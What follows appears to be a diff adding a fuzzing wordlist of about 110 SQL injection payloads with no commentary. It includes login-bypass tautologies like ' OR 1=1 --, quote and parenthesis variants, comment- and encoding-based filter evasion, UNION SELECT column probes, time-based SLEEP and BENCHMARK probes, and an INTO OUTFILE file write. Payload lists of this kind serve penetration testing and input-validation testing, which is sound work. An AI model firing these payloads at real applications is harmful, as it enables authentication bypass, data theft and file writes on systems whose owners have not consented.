@@ -1,0 +1,110 @@
+' OR 1=1 /*
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 ;%00
+' /**/OR/**/1=1--
+' /*!50000OR*/ 1=1--
+' %0AOR%0A1=1--
+' %09OR%091=1--
+' OR/**/1/**/=/**/1--
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1 OFFSET 0--
+' OR 1=1 ORDER BY 1--
+' OR 1=1 GROUP BY 1--
+' OR 1=1 HAVING 1=1--
+' OR 1=1 INTO @var--
+' OR 1=1 INTO OUTFILE '/tmp/test'--
+' OR 1=1 PROCEDURE ANALYSE()--
+' OR 1=1 AND SLEEP(0)--
+' OR 1=1 AND BENCHMARK(1,MD5('test'))--
+' OR 1=1 AND (SELECT 1)--
+' OR 1=1 AND (SELECT 1 FROM dual)--
+' OR 1=1 AND (SELECT 1 FROM (SELECT 1)a)--
+' OR 1=1 UNION SELECT NULL--
+' OR 1=1 UNION SELECT 1--
+' OR 1=1 UNION SELECT 1,2--
+' OR 1=1 UNION SELECT 1,2,3--
+' OR 1=1 UNION ALL SELECT NULL--
+' OR 1=1 UNION ALL SELECT 1--
+' OR 1=1 UNION ALL SELECT 1,2--
+' OR 1=1 UNION ALL SELECT 1,2,3--
+' OR 'a'='a
+' OR 'a'='a' /*
+' OR 'a'='a' --
+' OR 'a'='a' #
+' OR 'a'='a' ;%00
+' OR 'a'='a' LIMIT 1--
+' OR 'a'='a' ORDER BY 1--
+' OR 'a'='a' AND SLEEP(0)--
+' OR 'a'='a' UNION SELECT NULL--
+' OR 'a'='a' UNION SELECT 1--
+' OR 'a'='a' UNION SELECT 1,2--
+' OR 'a'='a' UNION SELECT 1,2,3--
+' OR "a"="a
+' OR "a"="a" /*
+' OR "a"="a" --
+' OR "a"="a" #
+' OR "a"="a" ;%00
+' OR "a"="a" LIMIT 1--
+' OR "a"="a" ORDER BY 1--
+' OR "a"="a" AND SLEEP(0)--
+' OR "a"="a" UNION SELECT NULL--
+' OR "a"="a" UNION SELECT 1--
+' OR "a"="a" UNION SELECT 1,2--
+' OR "a"="a" UNION SELECT 1,2,3--
+') OR ('a'='a
+') OR ('a'='a') /*
+') OR ('a'='a') --
+') OR ('a'='a') #
+') OR ('a'='a') ;%00
+') OR ('a'='a') LIMIT 1--
+') OR ('a'='a') ORDER BY 1--
+') OR ('a'='a') AND SLEEP(0)--
+') OR ('a'='a') UNION SELECT NULL--
+') OR ('a'='a') UNION SELECT 1--
+') OR ('a'='a') UNION SELECT 1,2--
+') OR ('a'='a') UNION SELECT 1,2,3--
+")) OR (("a"="a
+")) OR (("a"="a")) /*
+")) OR (("a"="a")) --
+")) OR (("a"="a")) #
+")) OR (("a"="a")) ;%00
+")) OR (("a"="a")) LIMIT 1--
+")) OR (("a"="a")) ORDER BY 1--
+")) OR (("a"="a")) AND SLEEP(0)--
+")) OR (("a"="a")) UNION SELECT NULL--
+")) OR (("a"="a")) UNION SELECT 1--
+")) OR (("a"="a")) UNION SELECT 1,2--
+")) OR (("a"="a")) UNION SELECT 1,2,3--
+' OR 1=1 WHERE 1=1--
+' OR 1=1 WHERE 'a'='a'--
+' OR 1=1 WHERE "a"="a"--
+' OR 1=1 WHERE 1 IN (1)--
+' OR 1=1 WHERE 'a' IN ('a')--
+' OR 1=1 WHERE 1 LIKE 1--
+' OR 1=1 WHERE 'a' LIKE 'a'--
+' OR 1=1 WHERE 1 BETWEEN 0 AND 2--
+' OR 1=1 WHERE 'a' BETWEEN 'a' AND 'z'--
+' OR 1=1 WHERE 1 IS NOT NULL--
+' OR 1=1 WHERE 'a' IS NOT NULL--
+' OR 1=1 WHERE EXISTS(SELECT 1)--
+' OR 1=1 WHERE NOT EXISTS(SELECT 0)--
+' OR 1=1 WHERE 1 XOR 0--
+' OR 1=1 WHERE NOT 0--
+' OR 1=1 WHERE !!1--
+' OR 1=1 WHERE 1&1--
+' OR 1=1 WHERE 1|1--
+' OR 1=1 WHERE 1^0--
+' OR 1=1 WHERE 1<<0--
+' OR 1=1 WHERE 1>>0--
+' OR 1=1 WHERE 1 DIV 1--
+' OR 1=1 WHERE 1 MOD 1=0--
+' OR 1=1 WHERE POW(1,1)=1--
+' OR 1=1 WHERE SQRT(1)=1--
+' OR 1=1 WHERE CEIL(1)=1--
+' OR 1=1 WHERE FLOOR(1)=1--
+' OR 1=1 WHERE ROUND(1)=1--
+' OR 1=1 WHERE SIGN(1)=1--
+' OR 1=1 WHERE ABS(1)=1--
+' OR 1=1 WHERE GREATEST(1,0)=1--
+' OR 1=1 WHERE LEAST(1,2)=1--
